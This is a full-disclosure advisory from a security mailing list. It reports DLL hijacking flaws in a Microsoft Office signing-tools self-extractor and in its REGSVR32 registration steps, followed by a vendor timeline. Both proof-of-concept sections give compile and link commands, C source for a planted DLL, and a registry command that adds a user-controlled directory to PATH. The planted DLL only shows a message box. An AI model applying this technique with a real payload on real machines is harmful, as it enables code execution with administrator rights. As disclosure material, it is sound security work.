@@ -1,0 +1,213 @@
+
+Date: Fri, 18 Jan 2019 21:15:23 +0100
+From: "Stefan Kanthak" <stefan.kanthak@...go.de>
+To: <bugtraq@...urityfocus.com>
+Cc: <fulldisclosure@...lists.org>
+Subject: Defense in depth -- the Microsoft way (part 59): we only fix every other vulnerability
+
+Hi @ll
+
+the executable self-extractor (and its payload too)
+<https://download.microsoft.com/download/F/B/4/FB46F8CA-6A6F-4CB0-B8F4-06BF3D44DA48/officesips.exe>
+for the "Microsoft Office Subject Interface Packages for Digitally Signing VBA Projects",
+available via <https://www.microsoft.com/en-us/download/details.aspx?id=56617>,
+published April 19 2018, is (SURPRISE!) vulnerable!
+
+Vulnerability #1
+================
+
+On a fully patched Windows 7, officesips.exe loads at least the
+following system DLLs from its "application directory" instead
+from Windows' "system directory" %SystemRoot%\System32\:
+
+    UXTheme.dll, Cabinet.dll, Version.dll, WindowsCodecs.dll,
+    AppHelp.dll, SrvCli.dll, CSCAPI.dll, SLC.dll, Secur32.dll,
+    NTMARTA.dll, SAMCli.dll, SAMLib.dll, NetUtils.dll
+
+For executable self-extractors and installers the "application
+directory" is typically the user's "Downloads" directory
+%USERPROFILE%\Downloads, where the unprivileged user or an
+attacker can place these DLLs (the latter for example per
+"drive by" download), resulting in arbitrary code execution.
+
+See <https://cwe.mitre.org/data/definitions/426.html>
+and <https://cwe.mitre.org/data/definitions/427.html>
+plus <https://capec.mitre.org/data/definitions/471.html>
+for this well-known and well-documented vulnerability.
+
+Also see Microsofts own guidance
+<https://technet.microsoft.com/en-us/library/2269637.aspx>,
+<https://msdn.microsoft.com/en-us/library/ff919712.aspx>,
+<https://msdn.microsoft.com/en-us/library/ms682586.aspx> and
+<http://blogs.technet.com/b/srd/archive/2014/05/13/load-library-safely.aspx>
+for avoiding such BEGINNER'S ERRORS!
+
+Proof of concept:
+~~~~~~~~~~~~~~~~~
+
+1. follow the instructions on
+   <https://skanthak.homepage.t-online.de/minesweeper.html>
+   and build "forwarder" DLLs for the above named system DLLs in
+   your "Downloads" directory.
+
+2. fetch
+   <https://download.microsoft.com/download/F/B/4/FB46F8CA-6A6F-4CB0-B8F4-06BF3D44DA48/officesips.exe>
+   and save it in your "Downloads" directory.
+
+3. run officesips.exe per double-click: notice the message boxes
+   displayed from the DLLs built in step 1.
+
+
+FIX: DUMP ALL THESE VULNERABLE EXECUTABLES!
+     Provide an authenticode signed .CAB with the payload instead!
+
+
+The icing on the cake: the "application manifest" embedded within
+the executable self-extractor specifies "requireAdministrator", thus
+resulting in arbitrary code execution WITH escalation of privilege.
+
+
+But it's not over yet: as recommended by the included readme.txt,
+extract the files into the well-secured %ProgramFiles% directory
+(this is easy, as the self-extractor already acquired the necessary
+administrative privileges already.-).
+
+Following the instructions from the readme.txt, start an elevated
+command prompt via [Shift] right-click and (try to) register the
+extracted DLLs via the following command lines:
+
+    REGSVR32.exe "%ProgramFiles%\vbe7.dll"
+    REGSVR32.exe "%ProgramFiles%\msosip.dll"
+    REGSVR32.exe "%ProgramFiles%\msosipx.dll"
+
+
+Vulnerability #2
+================
+
+These command lines load the following DLLs from the PATH, calling
+their entry point function with administrative privileges:
+
+    MSVCR100.dll, VCRuntime140.dll and MSVCP140.dll
+
+Since these DLLs are NOT shipped with Windows they are searched via
+the PATH; if these DLLs are not found, REGSVR32.exe displays an error
+message, clearly indicating this weakness.
+
+AGAIN see <https://cwe.mitre.org/data/definitions/426.html>
+and <https://cwe.mitre.org/data/definitions/427.html>
+plus <https://capec.mitre.org/data/definitions/471.html>
+for this well-known and well-documented vulnerability.
+
+(Unprivileged) users have FULL control over their own PATH environment
+variable stored in the following registry entry
+
+    [HKEY_CURRENT_USER\Environment]
+    "PATH"="<arbitrary directory>[;...]"
+
+During user logon, the user's PATH is appended to the machine's PATH.
+The (unprivileged) user can also change the PATH environment variable
+ANY time after logon.
+The (changed) PATH is inherited by EVERY new process, including the
+elevated command prompt started by the user via [Shift] right-click.
+
+Proof of concept:
+~~~~~~~~~~~~~~~~~
+
+1. dump the imports referenced by VBE7.dll, MSOSIP.dll and MSOSIPX.dll
+   in their load-time dependencies MSVCR100.dll, MSVCP140.dll and
+   VCRuntime140.dll:
+
+   LINK.exe /DUMP /IMPORTS /OUT:officesips.txt "%ProgramFiles%\vbe7.dll" "%ProgramFiles%\msosip.dll" "%ProgramFiles%\msosipx.dll"
+
+2. use an arbitrary text editor to generate module definition files
+   MSVCR100.def, MSVCP140.def and VCRuntime140.def from the output
+   file officesips.txt
+
+--- MSVCR100.def ---
+LIBRARY MSVCR100
+
+EXPORTS
+       __clean_type_info_names_internal=_dummy
+       ?_type_info_dtor_internal_method@...e_info@@QAEXXZ=_dummy
+       ...
+--- EOF ---
+
+3. create the following text file:
+
+--- officesips.c ---
+#include <windows.h>
+
+BOOL WINAPI _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    MessageBoxW((HWND) NULL, L"pwned!", L"pwned!", MB_ICONERROR);
+    return TRUE;
+}
+
+DWORD dummy = 0;
+--- EOF ---
+
+4. compile the source file created in the previous step:
+
+   CL.exe /c /Tcofficesips.c
+
+5. link the object file compiled in the previous step using the
+   module definition files generated before:
+
+   LINK.exe /DEF:MSVCR100.def /DEFAULTLIB:user32.dll /DLL /ENTRY:_DllMainCRTStartup /OUT:MSVCR100.dll /SUBSYSTEM:Windows
+officesips.obj
+   LINK.exe /DEF:MSVCP140.def /DEFAULTLIB:user32.dll /DLL /ENTRY:_DllMainCRTStartup /OUT:MSVCP140.dll /SUBSYSTEM:Windows
+officesips.obj
+   LINK.exe /DEF:VCRuntime140.def /DEFAULTLIB:user32.dll /DLL /ENTRY:_DllMainCRTStartup /OUT:VCRuntime140.dll /SUBSYSTEM:Windows
+officesips.obj
+
+6. add the directory (I use the CWD here) where you built the
+   3 DLLs to your PATH environment variable, for example via:
+
+   REG.EXE ADD HKCU\Environment /V PATH /T REG_EXPAND_SZ /D "%CD%" /F
+
+7. start an elevated command prompt and run the PATH command:
+   notice the directory added to the PATH in the previous step
+   in the printed output.
+
+8. run the command lines to register VBE7.dll, MSOSIP.DLL and
+   MSOSIPX.dll: notice the message boxes displayed from the
+   previously built DLLs!
+
+   REGSVR32.exe "%ProgramFiles%\vbe7.dll"
+   REGSVR32.exe "%ProgramFiles%\msosip.dll"
+   REGSVR32.exe "%ProgramFiles%\msosipx.dll"
+
+
+stay tuned
+Stefan Kanthak
+
+
+Timeline:
+~~~~~~~~~
+
+2018-05-29    vulnerability report sent to vendor
+
+2018-05-30    vendor acknowledges receipt, opens case 45733
+
+2018-10-18    answer from vendor: "The product was fixed."
+
+2018-10-21    followup sent to vendor:
+              "NO, the product is NOT fixed.
+               You fixed only the vulnerable self-extractor!"
+
+2018-10-23    reply from vendor:
+              "I will forward your feedback to the Engineering Team
+               responsible."
+
+2018-11-06    reply from vendor:
+              "We are closing this case as a Duplicate of one of
+               your earlier cases, 37732, which was fixed with an
+               Advisory based on a Defense in Depth method."
+
+2018-11-06    "OUCH!
+               Case 37732 was %SystemRoot%\Temp\OSE*.exe, running
+               under SYSTEM account, loads a bunch of DLLs from its
+               application directory, which is writable by unprivileged
+               users. This is COMPLETELY unrelated."
+
+              no more reply from BRAINDEAD vendor!
